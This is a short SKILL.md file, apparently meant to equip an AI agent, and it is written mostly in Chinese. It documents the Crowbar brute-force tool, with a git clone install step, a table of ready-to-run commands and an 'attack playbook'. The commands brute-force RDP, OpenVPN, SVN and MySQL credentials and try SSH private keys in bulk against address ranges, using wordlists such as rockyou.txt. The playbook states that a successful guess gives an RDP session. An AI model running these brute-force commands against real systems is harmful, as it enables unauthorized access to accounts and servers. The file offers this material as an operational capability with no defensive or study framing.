---
name: crowbar-brute
description: "Crowbar: Brute-forces RDP passwords. Signals: password cracking, hash cracking, RDP brute force, private key brute force, OpenVPN brute force."
zh-signals: "Crowbar: RDP 口令爆破。信号:密码破解,哈希破解,RDP 爆破,私钥撞库,OpenVPN 爆破。"
---

# Crowbar

- 攻击大类:C25 口令与哈希破解
- 上游仓库:https://github.com/galkan/crowbar
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/galkan/crowbar && cd crowbar
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `crowbar -b rdp -s 10.0.0.5/32 -u admin -C pass.txt` | RDP 爆破 |
| `crowbar -b sshkey -s 10.0.0.0/24 -U users.txt -K keys/` | 私钥撞库 |
| `crowbar -b vpn -s 10.0.0.1 -p 443 -u user -C pass.txt` | OpenVPN 爆破 |
| `-b svn / -b mysql` | 其他协议 |
| `-v` | 详细输出 |

## 攻击场景 Playbook

### RDP 口令爆破

```bash
crowbar -b rdp -s 10.0.0.5 -u administrator -C rockyou.txt
# 命中即得 RDP 会话
```

## 注意事项

特点是用 SSH 私钥批量撞库(私钥+用户名字典),其他工具少见。
